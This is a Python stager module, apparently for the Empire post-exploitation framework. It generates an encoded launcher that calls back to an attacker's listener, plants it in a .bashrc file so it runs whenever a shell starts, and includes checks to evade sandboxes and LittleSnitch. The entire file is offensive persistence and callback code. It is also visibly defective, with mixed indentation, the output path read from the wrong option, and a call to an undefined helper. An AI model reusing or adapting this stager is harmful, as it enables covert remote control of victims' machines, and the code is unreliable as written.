
class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Bashrc file',

            'Author': '@homjxie',

            'Description': ('Generate Stager in file .bashrc Language Code a execute to show File Stager .bashrc Ctrl With H | And in Powershell execute Via Cmder New Console With bash::bash.'),

            'Comments': [
                'https://twitter.com/homjxi0e'
            ]
        }


        self.options = {


            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'python'
            },
            'OutFile' : {
                'Description'   :   'File to output Bash script to, otherwise displayed on the screen.',
                'Required'      :   True,
                'Value'         :   '/tmp/.bashrc'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }



        self.mainMenu = mainMenu

        for param in params:

            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):


        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
	OutFile = self.options['SafeChecks']['Value']


        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

	if OutFile == "":
            print Path.color("[!] Error In Path Man !!! .")
            return ""

        else:
	    script = "#execute Stager Via .bashrc And Powershell execute Via Cmder New Console With bash::bash\n"

	    script += "%s\n" %(launcher)

            return script
